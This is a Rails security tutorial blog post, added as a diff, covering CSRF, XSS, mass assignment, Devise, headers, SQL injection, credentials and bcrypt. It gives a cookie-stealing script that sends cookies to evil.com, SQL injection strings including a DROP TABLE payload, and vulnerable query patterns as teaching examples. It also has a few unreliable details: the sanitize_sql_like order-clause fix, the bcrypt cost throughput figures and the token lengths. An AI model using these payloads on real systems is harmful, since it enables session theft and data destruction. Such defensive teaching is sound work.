@@ -1,0 +1,734 @@
+---
+title: "Rails Security: Protecting Your Application from Common Attacks"
+description: "Rails has strong security defaults, but you still need to understand the threats. Learn CSRF protection, SQL injection prevention, authentication with Devise, password hashing, encrypted credentials, and security headers — with interactive demos."
+date: 2026-04-05
+tags: ["ruby", "rails", "security", "authentication", "csrf"]
+---
+
+import CsrfAttackDemo from '../../components/demos/CsrfAttackDemo'
+import DeviseModulesDemo from '../../components/demos/DeviseModulesDemo'
+import SqlInjectionDemo from '../../components/demos/SqlInjectionDemo'
+import PasswordHashDemo from '../../components/demos/PasswordHashDemo'
+
+## Rails' Security Philosophy
+
+Think of Rails as a house that comes pre-equipped with deadbolts on every door, smoke detectors in every room, a security system already armed, and a safe built into the wall. You did not have to install any of it — the builder (Rails core team) put it all there because they know what threats exist.
+
+Rails is famous for being **secure by default**. The framework ships with protections that other frameworks leave as exercises for the developer. This is not an accident. David Heinemeier Hansson and the Rails core team made a deliberate decision: security should be the path of least resistance.
+
+Here is what Rails does automatically, before you write a single line of custom security code:
+
+| Protection | What It Does | Enabled By Default? |
+|---|---|---|
+| CSRF tokens | Prevents cross-site request forgery | Yes (forms) |
+| SQL escaping | Parameterizes database queries | Yes (Active Record) |
+| XSS escaping | HTML-encodes output in views | Yes (ERB, since Rails 3) |
+| Strong parameters | Prevents mass assignment | Yes (since Rails 4) |
+| Secure cookies | Sets HttpOnly, SameSite on session cookies | Yes |
+| Password hashing | Uses bcrypt for `has_secure_password` | When used |
+| Encrypted secrets | Encrypts credentials with a master key | Yes (since Rails 5.2) |
+
+The **OWASP Top 10** is the standard list of the most critical web application security risks. Rails addresses every single one out of the box or with minimal configuration. Let us walk through each defense.
+
+## CSRF Protection
+
+Imagine you are logged into your bank's website. You have an active session — a cookie in your browser that says "this is Alice, she is authenticated." Now you open a new tab and visit a harmless-looking blog post. But hidden inside that blog post is an invisible form that automatically submits a POST request to your bank: "Transfer $500 from Alice's account to attacker@example.com."
+
+Because your browser automatically attaches cookies to every request sent to the bank's domain, the bank receives what looks like a legitimate request from you. The cookie is there, the session is valid, the money gets transferred.
+
+This is **Cross-Site Request Forgery (CSRF)**, also called "session riding" or "one-click attack." The attacker does not need to steal your credentials — they trick your browser into making a request on your behalf.
+
+Rails defends against this with an **authenticity token**. Think of it like a receptionist at an office building. Every visitor gets a badge at the front desk. When they try to enter a restricted area, the security guard checks the badge. If the badge does not match (or is missing), access is denied.
+
+Here is how it works:
+
+1. When Rails renders a form, it embeds a hidden field called `authenticity_token`
+2. This token is a random, cryptographically strong string tied to the user's session
+3. When the form is submitted, Rails verifies the token matches what it gave out
+4. A malicious site cannot know the token because it is different for each session and each form
+
+```erb
+<%= form_with model: @transfer do |f| %>
+  <%= f.hidden_field :authenticity_token, value: form_authenticity_token %>
+  <%= f.text_field :recipient %>
+  <%= f.number_field :amount %>
+  <%= f.submit "Transfer" %>
+<% end %>
+```
+
+The token is also available for AJAX requests via the `csrf-token` meta tag in your layout:
+
+```erb
+<%= csrf_meta_tags %>
+```
+
+This generates a meta tag that JavaScript libraries like Rails UJS or Turbo can read and include in request headers.
+
+<CsrfAttackDemo client:visible />
+
+## Common Vulnerabilities and Rails Defenses
+
+Web applications face a predictable set of attacks. Rails has spent two decades building defenses against each one. Let us walk through the major threats and what Rails does about them.
+
+### Cross-Site Scripting (XSS)
+
+An attacker injects malicious JavaScript into a page that other users view. For example, a forum post that contains `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`.
+
+Rails escapes all output by default. In ERB templates, `<%= @comment.body %>` automatically HTML-encodes the content, turning `<script>` into `&lt;script&gt;`. If you explicitly want to render raw HTML (and you are sure it is safe), you use `raw()` or `html_safe`:
+
+```erb
+<%= raw @comment.body %>  <%# DANGER: only if you trust the source %>
+<%= @comment.body.html_safe %>  <%# same danger %>
+```
+
+The rule is simple: never use `raw` or `html_safe` on user input. Only use it on content you generated yourself (like rendered markdown from a trusted source).
+
+### Mass Assignment
+
+Imagine a User model with fields: `name`, `email`, `admin`. An attacker sends a sign-up form with an extra hidden field: `<input type="hidden" name="user[admin]" value="true">`. If the controller blindly assigns all submitted parameters, the attacker just made themselves an admin.
+
+Rails 4 introduced **Strong Parameters** to solve this. You must explicitly permit which attributes are allowed:
+
+```ruby
+def user_params
+  params.require(:user).permit(:name, :email)
+end
+```
+
+Any attribute not in the `permit` list is silently ignored. `admin` is never assigned, regardless of what the attacker sends.
+
+### Forceful Browsing
+
+An attacker tries to access admin pages by directly visiting `/admin/dashboard`. Rails does not enforce authorization by default (that is your job), but it gives you tools like `before_action` filters:
+
+```ruby
+class AdminController < ApplicationController
+  before_action :require_admin!
+
+  private
+
+  def require_admin!
+    redirect_to root_path, alert: "Access denied" unless current_user&.admin?
+  end
+end
+```
+
+### File Upload Attacks
+
+Uploading malicious files (PHP shells, executables) can give attackers server access. Rails does not handle file uploads in core, but Active Storage (the built-in file management framework) stores files separately from the database and generates unique filenames, making direct execution difficult.
+
+### Security Checklist
+
+- All user input is escaped in views by default? Yes (Rails)
+- Strong parameters whitelist permitted attributes? Yes (your code)
+- CSRF tokens on all state-changing forms? Yes (Rails)
+- SQL queries parameterized? Yes (Active Record)
+- Passwords hashed with bcrypt? Yes (when using `has_secure_password`)
+- Session cookies are HttpOnly and Secure? Yes (Rails)
+- Sensitive data in encrypted credentials? Yes (your configuration)
+- Admin actions behind authorization filters? Yes (your code)
+
+## User Authentication
+
+Authentication answers the question: "Who are you?" Before we can authorize actions (what you are allowed to do), we need to verify identity.
+
+Think of authentication like getting a VIP wristband at a club. You show your ID at the door (credentials), the bouncer checks you against the guest list (database), and if everything matches, you get a wristband (session cookie). Every time you try to enter a restricted area, someone checks your wristband — you do not need to show your ID again.
+
+Rails gives you a lightweight built-in method for password-based authentication: `has_secure_password`.
+
+### has_secure_password
+
+Add `has_secure_password` to your User model and Rails handles the entire password lifecycle:
+
+```ruby
+class CreateUsers < ActiveRecord::Migration[7.1]
+  def change
+    create_table :users do |t|
+      t.string :name
+      t.string :email, null: false
+      t.string :password_digest, null: false
+      t.timestamps
+    end
+    add_index :users, :email, unique: true
+  end
+end
+```
+
+```ruby
+class User < ApplicationRecord
+  has_secure_password
+  validates :email, presence: true, uniqueness: true
+end
+```
+
+What `has_secure_password` gives you:
+
+- **Password hashing** — automatically hashes passwords using bcrypt before storing them
+- **Authentication method** — `user.authenticate("password")` returns the user if correct, `false` if wrong
+- **Validation** — ensures `password` and `password_confirmation` match on creation
+- **No plaintext storage** — only `password_digest` is stored in the database, never the raw password
+
+Here is the authentication flow in a sessions controller:
+
+```ruby
+class SessionsController < ApplicationController
+  def new
+  end
+
+  def create
+    user = User.find_by(email: params[:email])
+    if user&.authenticate(params[:password])
+      session[:user_id] = user.id
+      redirect_to dashboard_path, notice: "Welcome back!"
+    else
+      flash.now[:alert] = "Invalid email or password"
+      render :new, status: :unauthorized
+    end
+  end
+
+  def destroy
+    session.delete(:user_id)
+    redirect_to root_path, notice: "Logged out"
+  end
+end
+```
+
+A `current_user` helper in `ApplicationController` makes the authenticated user available everywhere:
+
+```ruby
+class ApplicationController < ActionController::Base
+  helper_method :current_user
+
+  private
+
+  def current_user
+    @current_user ||= User.find_by(id: session[:user_id]) if session[:user_id]
+  end
+end
+```
+
+This is clean, minimal, and covers 80% of use cases. But for production applications with password resets, email confirmations, account locking, and third-party login, you will want something more powerful.
+
+## Devise: The Authentication Powerhouse
+
+Devise is the most popular authentication gem in the Rails ecosystem. Built on top of Warden (a Rack-based authentication framework), it provides a modular, configurable authentication system that handles everything from basic login to two-factor authentication.
+
+Think of Devise as a Swiss Army knife for authentication. Each module is a separate tool — you only carry the ones you need.
+
+### The Modules
+
+Devise is built from ten independent modules. You pick the ones you need:
+
+```ruby
+class User < ApplicationRecord
+  devise :database_authenticatable, :registerable,
+         :recoverable, :rememberable, :validatable
+end
+```
+
+That single line activates five modules, each adding its own routes, model methods, views, and mailers. No additional controllers or configuration needed.
+
+### Setup
+
+Install Devise in three steps:
+
+```bash
+bundle add devise
+rails generate devise:install
+rails generate devise User
+rails db:migrate
+```
+
+The generator creates:
+
+- A `User` model with Devise modules configured
+- A migration with the required columns (`email`, `encrypted_password`, and columns for any active modules)
+- Configurable views (generate them with `rails generate devise:views`)
+- A `devise_for :users` route in `config/routes.rb`
+- An initializer at `config/initializers/devise.rb`
+
+### Configuration
+
+The initializer lets you customize nearly every aspect:
+
+```ruby
+Devise.setup do |config|
+  config.mailer_sender = "noreply@example.com"
+  config.case_insensitive_keys = [:email]
+  config.strip_whitespace_keys = [:email]
+  config.password_length = 8..128
+  config.reset_password_within = 6.hours
+  config.sign_out_via = :delete
+  config.responder.error_status = :unprocessable_entity
+  config.responder.redirect_status = :see_other
+end
+```
+
+### Customizing Views
+
+Generate the built-in views to customize them:
+
+```bash
+rails generate devise:views
+```
+
+This creates ERB templates in `app/views/devise/` for every Devise controller (sessions, registrations, passwords, etc.). Edit them like any other Rails view.
+
+### When to Use Devise vs. Rolling Your Own
+
+| Scenario | Recommendation |
+|---|---|
+| Simple internal app, 1-2 developers | `has_secure_password` |
+| Production app with user accounts | Devise |
+| API-only app | Devise with `:api` mode or custom JWT tokens |
+| Multi-tenant SaaS | Devise + custom authorization layer |
+| Social login required | Devise + OmniAuth |
+
+<DeviseModulesDemo client:visible />
+
+## Security Headers
+
+HTTP response headers tell browsers how to handle your content. The right headers can prevent an entire class of attacks without any application code changes.
+
+Think of security headers like the rules posted at the entrance of a building: "No food in the server room," "Badge required beyond this point," "Cameras not permitted." The browser enforces these rules on your behalf.
+
+Rails sets several security headers automatically and lets you configure the rest.
+
+### Rails Default Headers
+
+Rails automatically sets these headers on every response:
+
+```
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 0
+X-Content-Type-Options: nosniff
+X-Permitted-Cross-Domain-Policies: none
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+### Content-Security-Policy (CSP)
+
+CSP is the most powerful security header. It tells the browser which sources (domains) are allowed to load scripts, styles, images, fonts, and other resources. If an attacker injects a `<script>` tag pointing to `evil.com`, CSP blocks it.
+
+Rails has built-in CSP support via `ActionDispatch::ContentSecurityPolicy`:
+
+```ruby
+Rails.application.config.content_security_policy do |policy|
+  policy.default_src :self, :https
+  policy.font_src    :self, :https, :data
+  policy.img_src     :self, :https, :data
+  policy.object_src  :none
+  policy.script_src  :self, :https
+  policy.style_src   :self, :https
+  policy.report_uri  "/csp-violation-report-endpoint"
+end
+```
+
+### Strict-Transport-Security (HSTS)
+
+HSTS tells the browser: "Always use HTTPS for this domain. Never attempt an HTTP connection." This prevents SSL stripping attacks where an attacker downgrades a connection from HTTPS to HTTP.
+
+```ruby
+Rails.application.config.ssl_options = {
+  hsts: {
+    expires: 1.year,
+    preload: true,
+    subdomains: true
+  }
+}
+```
+
+With `preload: true`, your domain is eligible for inclusion in the browser's HSTS preload list — a hard-coded list of domains that browsers will ONLY connect to over HTTPS, with no exceptions.
+
+### Secure Cookies
+
+In production, Rails automatically sets cookies as `Secure` (only sent over HTTPS) and `HttpOnly` (not accessible to JavaScript). Configure this explicitly:
+
+```ruby
+Rails.application.config.action_dispatch.cookies_secure = true
+Rails.application.config.action_dispatch.cookies_same_site = :lax
+```
+
+### Headers Summary
+
+| Header | Purpose | Rails Default |
+|---|---|---|
+| `X-Frame-Options` | Prevents clickjacking by disallowing embedding in frames | `SAMEORIGIN` |
+| `X-Content-Type-Options` | Prevents MIME-type sniffing | `nosniff` |
+| `Content-Security-Policy` | Controls which resources can be loaded | Not set (configure it) |
+| `Strict-Transport-Security` | Forces HTTPS connections | Not set (configure it) |
+| `Referrer-Policy` | Controls how much referrer info is sent | `strict-origin-when-cross-origin` |
+
+## SQL Injection Prevention
+
+SQL injection is one of the oldest and most dangerous web attacks. An attacker manipulates database queries by injecting malicious SQL through user input. The consequences range from data theft to complete database destruction.
+
+### How SQL Injection Works
+
+Consider a login query built with string concatenation:
+
+```ruby
+query = "SELECT * FROM users WHERE email = '#{params[:email]}' AND password = '#{params[:password]}'"
+```
+
+An attacker enters `' OR '1'='1` as their email. The query becomes:
+
+```sql
+SELECT * FROM users WHERE email = '' OR '1'='1' AND password = ''
+```
+
+Since `'1'='1'` is always true, the query returns every row in the users table. The attacker is logged in as the first user (typically an admin).
+
+A more destructive input like `'; DROP TABLE users; --` turns the query into:
+
+```sql
+SELECT * FROM users WHERE email = ''; DROP TABLE users; --' AND password = ''
+```
+
+Two queries execute: the first returns nothing, the second deletes the entire users table.
+
+### How Rails Prevents It
+
+Active Record uses **parameterized queries** by default. When you write:
+
+```ruby
+User.where("email = ? AND password = ?", params[:email], params[:password])
+```
+
+Active Record sends the SQL and the parameters separately to the database. The parameters are never part of the SQL string itself, so injection is impossible. The database driver handles the safe interpolation internally.
+
+The same applies to all Active Record query methods:
+
+```ruby
+User.find_by(email: params[:email])
+User.where(name: params[:name])
+User.where(["created_at > ?", params[:date]])
+```
+
+All of these use parameterized queries under the hood.
+
+### When You Are Still Vulnerable
+
+Rails protects you in Active Record, but there are ways to accidentally bypass this protection:
+
+**String interpolation in where clauses:**
+
+```ruby
+User.where("email = '#{params[:email]}'")  # VULNERABLE
+User.where("email = ?", params[:email])     # SAFE
+```
+
+**Raw SQL with `find_by_sql`:**
+
+```ruby
+User.find_by_sql("SELECT * FROM users WHERE name = '#{params[:name]}'")  # VULNERABLE
+User.find_by_sql(["SELECT * FROM users WHERE name = ?", params[:name]])  # SAFE
+```
+
+**The `order` clause:**
+
+```ruby
+User.order(params[:sort_column])  # POTENTIALLY VULNERABLE
+User.order(Arel.sql(sanitize_sql_like(params[:sort_column])))  # SAFER
+```
+
+The `order` method does not accept parameterized values the same way `where` does. Always whitelist allowed column names.
+
+**Hash conditions are always safe:**
+
+```ruby
+User.where(email: params[:email], name: params[:name])  # ALWAYS SAFE
+```
+
+<SqlInjectionDemo client:visible />
+
+## Storing Sensitive Data Securely
+
+Secrets are the keys to your application's kingdom. Database credentials, API keys, encryption keys, third-party tokens — an attacker with these can impersonate your service, access your data, and cause irreversible damage.
+
+### What NOT to Do
+
+- Never commit secrets to source code (even private repos get forked, shared, or compromised)
+- Never store secrets in `config/database.yml` or `config/secrets.yml` checked into git
+- Never log secrets in development
+- Never send secrets over unencrypted connections (HTTP)
+- Never use the same secret across environments (dev vs. production)
+
+### Environment Variables
+
+The simplest approach: store secrets in environment variables, read them at runtime.
+
+```ruby
+# config/database.yml
+production:
+  adapter: postgresql
+  database: myapp_production
+  host: <%= ENV['DATABASE_HOST'] %>
+  username: <%= ENV['DATABASE_USER'] %>
+  password: <%= ENV['DATABASE_PASSWORD'] %>
+```
+
+```ruby
+# app/services/payment_service.rb
+class PaymentService
+  STRIPE_SECRET_KEY = ENV.fetch('STRIPE_SECRET_KEY')
+end
+```
+
+`ENV.fetch` raises an error if the variable is missing — better than silently getting `nil` and failing later.
+
+### The 12-Factor Approach
+
+The [12-Factor App](https://12factor.net/) methodology says: store configuration (including secrets) in environment variables, not in code. This is the standard for modern deployment:
+
+- **Development**: use a `.env` file (with `.env` in `.gitignore`) loaded by dotenv
+- **Production**: set environment variables in your hosting platform (Heroku config vars, AWS Parameter Store, Kubernetes secrets)
+
+### Rails Credentials (The Modern Way)
+
+Rails 5.2 introduced encrypted credentials, which we will look at in the next section. This is now the recommended approach for Rails applications — it encrypts secrets into a file that is safe to commit to source control.
+
+## Encrypted Credentials
+
+Rails 5.2 introduced the **encrypted credentials** system. This solves a common problem: you need to commit configuration to source control (so your team and CI/CD can access it), but you cannot commit plaintext secrets.
+
+Think of it like a safe deposit box. The box (credentials file) can be stored anywhere, even in public. But only people with the key (master key) can open it. The box itself reveals nothing.
+
+### How It Works
+
+Rails encrypts the file `config/credentials.yml.enc` using the key stored in `config/master.key`. The encrypted file is safe to commit to git. The master key must never be committed — it goes in `.gitignore` and is distributed out-of-band (environment variable, secret management service, etc.).
+
+### Editing Credentials
+
+Open the credentials editor:
+
+```bash
+EDITOR="code --wait" rails credentials:edit
+```
+
+This decrypts the file, opens it in your editor, and re-encrypts it when you close the editor. The file is never written to disk in plaintext.
+
+```yaml
+# config/credentials.yml.enc (contents visible during editing)
+db:
+  host: production-db.example.com
+  username: app_user
+  password: super_secret_db_password
+
+secret_key_base: abc123def456...
+
+stripe:
+  publishable_key: pk_live_...
+  secret_key: sk_live_...
+```
+
+### Reading Credentials in Code
+
+```ruby
+Rails.application.credentials.db[:host]         # => "production-db.example.com"
+Rails.application.credentials.db[:password]     # => "super_secret_db_password"
+Rails.application.credentials.secret_key_base   # => "abc123def456..."
+Rails.application.credentials.stripe[:secret_key] # => "sk_live_..."
+```
+
+### How It Works Under the Hood
+
+1. The master key is a 32-byte random string generated by Rails
+2. `config/credentials.yml.enc` is encrypted with AES-256-GCM using the master key
+3. The encrypted file contains the ciphertext, the IV (initialization vector), and an authentication tag
+4. At boot time, Rails reads the master key from `config/master.key` (or the `RAILS_MASTER_KEY` environment variable) and decrypts the credentials
+5. The decrypted content is parsed as YAML and available via `Rails.application.credentials`
+
+### Environment-Specific Credentials
+
+Rails 6 added support for per-environment credentials:
+
+```bash
+rails credentials:edit --environment staging
+rails credentials:edit --environment production
+```
+
+This creates separate encrypted files: `config/credentials/staging.yml.enc` and `config/credentials/production.yml.enc`, each with its own key.
+
+### Master Key Management
+
+The master key must be available at deploy time. Common approaches:
+
+| Approach | How |
+|---|---|
+| Environment variable | Set `RAILS_MASTER_KEY` on your deployment platform |
+| Deploy script | Copy `config/master.key` to the server during deployment |
+| Secret management | Store the key in AWS Secrets Manager, HashiCorp Vault, etc. |
+
+## Password Hashing
+
+You should never store passwords in plaintext. If your database is compromised (and databases get compromised regularly), plaintext passwords give attackers immediate access to every user's account on every other service where they reused the same password.
+
+### How bcrypt Works
+
+bcrypt is a password hashing algorithm designed specifically for passwords. It has three properties that make it ideal:
+
+1. **Slow by design** — bcrypt uses a configurable "cost factor" that determines how many times the hashing algorithm runs. The default cost of 10 means the hash takes about 100ms to compute. This makes brute-force attacks (trying millions of passwords per second) impractical.
+
+2. **Built-in salt** — every bcrypt hash includes a unique, random salt. Even if two users have the same password, their hashes are completely different. This defeats rainbow table attacks (pre-computed lookup tables of common passwords).
+
+3. **Adaptive** — as computers get faster, you increase the cost factor. Moving from cost 10 to cost 11 doubles the hashing time, keeping pace with hardware improvements.
+
+### The Structure of a bcrypt Hash
+
+A bcrypt hash looks like this:
+
+```
+$2b$12$N9qo8uLOickgx2ZMRZoMy.MQ2K6e5xS3nJh3R4E1X8JjLqO7ZI7WK
+```
+
+Breaking it down:
+
+| Part | Value | Meaning |
+|---|---|---|
+| Algorithm | `$2b$` | bcrypt version 2b |
+| Cost | `12` | 2^12 = 4,096 iterations |
+| Salt | `N9qo8uLOickgx2ZMRZoMy` | 22-character random salt |
+| Hash | `MQ2K6e5xS3nJh3R4E1X8JjLqO7ZI7WK` | 31-character hash output |
+
+### has_secure_password
+
+In Rails, `has_secure_password` wraps bcrypt into a clean API:
+
+```ruby
+class User < ApplicationRecord
+  has_secure_password
+end
+```
+
+This adds:
+
+- A `password` virtual attribute (not stored in the database)
+- A `password_confirmation` virtual attribute
+- A `password_digest` column in the database (where the hash is stored)
+- An `authenticate(password)` method that returns the user if correct, `false` if wrong
+- Automatic validation that password and confirmation match
+
+```ruby
+user = User.create(name: "Alice", email: "alice@example.com", password: "secret123", password_confirmation: "secret123")
+user.password_digest
+# => "$2b$12$N9qo8uLOickgx2ZMRZoMy.MQ2K6e5xS3nJh3R4E1X8JjLqO7ZI7WK"
+
+user.authenticate("secret123")
+# => #<User id: 1, name: "Alice", ...>
+
+user.authenticate("wrong_password")
+# => false
+```
+
+### The Cost Factor
+
+The cost factor controls how slow the hash is. Higher is more secure but slower:
+
+```ruby
+class User < ApplicationRecord
+  has_secure_password cost: 12
+end
+```
+
+| Cost | Hashes/second | Time per hash |
+|---|---|---|
+| 10 | ~10,000 | ~100ms |
+| 11 | ~5,000 | ~200ms |
+| 12 | ~2,500 | ~400ms |
+| 13 | ~1,200 | ~800ms |
+| 14 | ~600 | ~1.6s |
+
+A cost of 10-12 is standard. The goal is slow enough to hurt attackers but fast enough that users do not notice the delay on login.
+
+### Why You Never Store Plaintext Passwords
+
+- **Database breaches happen** — LinkedIn, Adobe, Yahoo, Marriott, and thousands of other companies have had their databases stolen
+- **Password reuse is rampant** — the average person reuses the same password across 7+ services
+- **A stolen password list is an skeleton key** — attackers try leaked passwords on every service (credential stuffing)
+
+<PasswordHashDemo client:visible />
+
+## has_secure_token
+
+Sometimes you need a random, unique token for a record — an API key, a password reset link, a confirmation URL, a session identifier. Rails provides `has_secure_token` for exactly this.
+
+### How It Works
+
+Add `has_secure_token` to your model and specify which column holds the token:
+
+```ruby
+class User < ApplicationRecord
+  has_secure_token :confirmation_token
+end
+```
+
+This generates a 24-character, URL-safe random string and stores it in the `confirmation_token` column. The token is generated automatically when the record is created.
+
+```ruby
+user = User.create(email: "alice@example.com")
+user.confirmation_token
+# => "p5Xk9vN2mQ7wR4jT8yL3aB6cF1hD0eG"
+```
+
+### The Column
+
+You need a string column in the database:
+
+```ruby
+class AddConfirmationTokenToUsers < ActiveRecord::Migration[7.1]
+  def change
+    add_column :users, :confirmation_token, :string, unique: true
+    add_index :users, :confirmation_token, unique: true
+  end
+end
+```
+
+### Regenerating Tokens
+
+Call `regenerate_confirmation_token` to generate a fresh token:
+
+```ruby
+user.regenerate_confirmation_token
+user.confirmation_token
+# => "qW7eR9tY2uI5oP8aS1dF3gH6jK0lN4x"
+```
+
+This is useful for password resets — when a user requests a new reset link, regenerate the token so the old link becomes invalid.
+
+### Common Use Cases
+
+| Use Case | Token Column | When Generated |
+|---|---|---|
+| Email confirmation | `confirmation_token` | On account creation |
+| Password reset | `reset_password_token` | On reset request |
+| API authentication | `api_token` | On account creation |
+| Session management | `session_token` | On login |
+| Email unsubscribe | `unsubscribe_token` | On newsletter subscription |
+
+### How Tokens Are Generated
+
+Rails uses `SecureRandom.base58(24)` to generate tokens. Base58 uses alphanumeric characters but excludes easily confused characters (0, O, I, l). This makes tokens safe to use in URLs and emails without encoding issues, and prevents confusion when users read them manually.
+
+## Self-Check
+
+Before you ship a Rails application, verify every item on this list:
+
+- [ ] Strong parameters whitelist every attribute in every controller
+- [ ] CSRF protection is enabled (default — verify it is not disabled)
+- [ ] All database queries use parameterized queries (no string interpolation in `where` clauses)
+- [ ] Passwords are hashed with bcrypt via `has_secure_password` or Devise
+- [ ] Session cookies are `Secure`, `HttpOnly`, and `SameSite=Lax` in production
+- [ ] Sensitive configuration is in encrypted credentials, not in source code
+- [ ] The master key is not committed to version control
+- [ ] Content-Security-Policy header is configured
+- [ ] HSTS is enabled in production
+- [ ] User-facing errors do not expose stack traces or internal details (set in `config/environments/production.rb`)
+- [ ] Admin actions are protected by authorization filters
+- [ ] File uploads are validated for type and size
+- [ ] `config/secrets.yml` and `config/master.key` are in `.gitignore`
+- [ ] `bundle audit` shows no known vulnerabilities in dependencies
+
+Run `bundle audit` regularly to check your dependencies against the Ruby Advisory Database. Run `brakeman` to scan your application for known vulnerability patterns.
+
+Rails gives you a strong security foundation, but security is not a feature you implement once and forget. It is a practice — a habit of thinking like an attacker every time you write code that touches user input, authentication, or data.
